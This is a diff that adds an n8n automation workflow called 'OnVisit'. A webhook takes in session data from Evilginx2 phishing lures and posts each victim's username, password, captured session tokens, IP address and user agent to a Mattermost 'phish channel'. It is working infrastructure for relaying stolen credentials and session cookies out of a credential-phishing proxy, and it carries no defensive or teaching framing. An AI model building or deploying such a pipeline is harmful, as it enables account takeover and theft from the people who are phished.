@@ -1,0 +1,93 @@
+{
+  "name": "OnVisit",
+  "nodes": [
+    {
+      "parameters": {},
+      "name": "Start",
+      "type": "n8n-nodes-base.start",
+      "typeVersion": 1,
+      "position": [
+        260,
+        400
+      ],
+      "alwaysOutputData": false,
+      "notesInFlow": false
+    },
+    {
+      "parameters": {
+        "httpMethod": "POST",
+        "path": "a21d6bad-37d9-42d8-aad2-1345678123",
+        "options": {}
+      },
+      "name": "Webhook",
+      "type": "n8n-nodes-base.webhook",
+      "typeVersion": 1,
+      "position": [
+        400,
+        400
+      ],
+      "webhookId": "a21d6bad-37d9-42d8-aad2-83941d77c24a",
+      "notesInFlow": true,
+      "notes": "Evilginx2 lure visitors"
+    },
+    {
+      "parameters": {
+        "channelId": "antmpdeqxfnajniuw813ooq6ow",
+        "message": "=## We caught a lure visitor\n\n| Data | Value |\n| ----------- | ------------------------------------------- |\n| id | {{$json[\"body\"][\"Session\"][\"id\"]}} |\n| phishlet | {{$json[\"body\"][\"Session\"][\"phishlet\"]}} |\n| landing_url | {{$json[\"body\"][\"Session\"][\"landing_url\"]}} |\n| remote_addr | {{$json[\"body\"][\"Session\"][\"remote_addr\"]}} |\n| user_agent | {{$json[\"body\"][\"Session\"][\"useragent\"]}} |\n| create_time | {{$json[\"body\"][\"Session\"][\"create_time\"]}} |\n| update_time | {{$json[\"body\"][\"Session\"][\"update_time\"]}} |\n| username | `{{$json[\"body\"][\"Session\"][\"username\"]}}` |\n| password | `{{$json[\"body\"][\"Session\"][\"password\"]}}` |\n| tokens | `{{$json[\"body\"][\"tokens\"]}}` |",
+        "attachments": [],
+        "otherOptions": {}
+      },
+      "name": "Mattermost",
+      "type": "n8n-nodes-base.mattermost",
+      "typeVersion": 1,
+      "position": [
+        800,
+        400
+      ],
+      "notesInFlow": true,
+      "credentials": {
+        "mattermostApi": "Mattermost test"
+      },
+      "notes": "Push msg phish channel"
+    },
+    {
+      "parameters": {
+        "functionCode": "items[0].json.body.Session.create_time = new Date(items[0].json.body.Session.create_time * 1000);\nitems[0].json.body.Session.update_time = new Date(items[0].json.body.Session.update_time * 1000);\nreturn items;"
+      },
+      "name": "Function",
+      "type": "n8n-nodes-base.function",
+      "typeVersion": 1,
+      "position": [
+        600,
+        400
+      ]
+    }
+  ],
+  "connections": {
+    "Webhook": {
+      "main": [
+        [
+          {
+            "node": "Function",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "Function": {
+      "main": [
+        [
+          {
+            "node": "Mattermost",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    }
+  },
+  "active": false,
+  "settings": {},
+  "id": "7"
+}
